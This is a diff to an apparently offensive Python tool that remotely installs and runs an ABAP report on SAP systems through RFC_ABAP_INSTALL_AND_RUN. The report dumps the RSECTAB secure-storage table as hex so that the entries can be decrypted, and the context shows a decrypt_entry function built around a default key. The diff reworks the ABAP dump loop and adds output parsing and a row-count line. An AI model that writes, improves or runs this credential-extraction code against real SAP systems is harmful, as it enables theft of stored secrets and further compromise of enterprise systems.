@@ -181,23 +181,18 @@ def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
 # ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
 # the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
 _ABAP_READ_RSECTAB = [
-    "REPORT ZSECSTORE.",
+    "REPORT ZSECSTORE LINE-SIZE 1000.",
     "TABLES: RSECTAB.",
-    "DATA: HEX TYPE STRING.",
-    "DATA: BYTE TYPE X LENGTH 1.",
-    "DATA: HEXC(2) TYPE C.",
-    "DATA: OFF TYPE I.",
+    "DATA: HEXSTR(368) TYPE C.",
+    "DATA: RAW(184) TYPE X.",
+    "DATA: CNT TYPE I.",
     "SELECT * FROM RSECTAB.",
-    "  CLEAR HEX.",
-    "  OFF = 0.",
-    "  WHILE OFF < 184.",
-    "    BYTE = RSECTAB-DATA+OFF(1).",
-    "    WRITE BYTE TO HEXC.",
-    "    CONCATENATE HEX HEXC INTO HEX.",
-    "    OFF = OFF + 1.",
-    "  ENDWHILE.",
-    "  WRITE: / RSECTAB-IDENT, '~~~', HEX.",
+    "  RAW = RSECTAB-DATA.",
+    "  HEXSTR = RAW.",
+    "  WRITE: / RSECTAB-IDENT, '~~~', HEXSTR.",
+    "  CNT = CNT + 1.",
     "ENDSELECT.",
+    "WRITE: / '~~~TOTAL:', CNT.",
 ]
 
 
@@ -268,8 +263,19 @@ def _read_rsectab_via_abap(node, creds) -> list | None:
                 print(f"[-] SecStore ABAP exec error: {res.get('error')}")
                 return None
 
+            output = res.get("output", [])
+            print(f"[*] SecStore ABAP output: {len(output)} lines")
+            if output:
+                # Show first few lines for diagnostics
+                for i, line in enumerate(output[:3]):
+                    print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")
+
             rows = []
-            for line in res.get("output", []):
+            for line in output:
+                if line.startswith("~~~TOTAL:"):
+                    total = line.split(":", 1)[1].strip()
+                    print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
+                    continue
                 if "~~~" not in line:
                     continue
                 parts = line.split("~~~", 1)
